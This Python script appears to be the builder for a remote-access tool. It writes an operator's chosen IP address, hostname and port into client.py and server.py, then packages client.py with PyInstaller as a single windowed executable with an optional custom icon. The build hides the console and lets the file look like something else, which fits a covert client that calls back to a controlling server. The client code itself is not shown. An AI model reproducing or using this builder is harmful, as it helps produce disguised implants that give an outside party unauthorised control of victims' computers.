import os, sys, socket

python_path = os.path.dirname(sys.executable)

objSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
objSocket.connect(("google.com", 0))
strCurrentIP = objSocket.getsockname()[0]
objSocket.close()

if not os.path.isfile("client.py"):
    print("client.py not found!")
    sys.exit(0)


print("1. Use: " + strCurrentIP)
print("2. Use a different IP address for server")
print("3. Use a DNS Hostname")

strChoice = input("\n" + "Type selection: ")

if strChoice == "1":
    pass
elif strChoice == "2":
    strCurrentIP = input("\n" + "Enter IP: ")
elif strChoice == "3":
    strDNSHostname = input("\n" + "Enter DNS Hostname: ")
else:
    print("Invalid Choice!")
    sys.exit(0)


strPort = input("\n" + "Enter port number (Press ENTER for default): ")

if strPort == "":
    pass
else:
    if not strPort.isdigit():
        print("You must enter numeric value!")
        sys.exit(0)
    elif not 0 <= int(strPort) <= 65535:
        print("You must enter a port between 0 and 65535!")
        sys.exit(0)

    elif not os.path.isfile("server.py"):
        print("server.py not found!")
        sys.exit(0)

    objServerFile = open("server.py", "r")
    arrFileContents = objServerFile.readlines()
    objServerFile.close()

    # use loop in order to ensure that line number doesnt matter
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:9] == "intPort =":
            arrFileContents[intCounter] = "intPort = " + strPort + "\n"
            break

    objServerFile = open("server.py", "w")
    objServerFile.writelines(arrFileContents)
    objServerFile.close()


objClientFile = open("client.py", "r")
arrFileContents = objClientFile.readlines()
objClientFile.close()

if strChoice == "2" or strChoice == "1":
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:9] == "strHost =" or arrFileContents[intCounter][0:11] == "# strHost =":
            arrFileContents[intCounter] = "strHost = \"" + strCurrentIP + "\"" + "\n"
            arrFileContents[intCounter + 1] = "# strHost = socket.gethostbyname(\"\")" + "\n"
            break
else:
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:9] == "strHost =" or arrFileContents[intCounter][0:11] == "# strHost =":
            arrFileContents[intCounter] = "# strHost = \"\"" + "\n"
            arrFileContents[intCounter + 1] = "strHost = socket.gethostbyname(\"" + strDNSHostname + "\")" + "\n"
            break

if strPort != "":
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:9] == "intPort =":
            arrFileContents[intCounter] = "intPort = " + strPort + "\n"
            break

objClientFile = open("client.py", "w")
objClientFile.writelines(arrFileContents)
objClientFile.close()


strIconChoice = input("\n" + "Path for icon (Press ENTER to skip): ")

strIconChoice = strIconChoice.replace("\"", "")


if strIconChoice == "":
    os.system(python_path + "/Scripts/pyinstaller client.py --exclude-module FixTk --exclude-module tcl --exclude-module tk "
                      "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
                      "--onefile --windowed")
elif not os.path.isfile(strIconChoice):
    print("Invalid path!")
    sys.exit(0)
elif not strIconChoice.endswith(".ico"):
    print("Must be a .ico file!")
    sys.exit(0)
else:
    os.system(python_path + "/Scripts/pyinstaller client.py --exclude-module FixTk --exclude-module tcl --exclude-module tk "
                      "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
                      "--onefile --windowed --icon=\"" + strIconChoice + "\"")
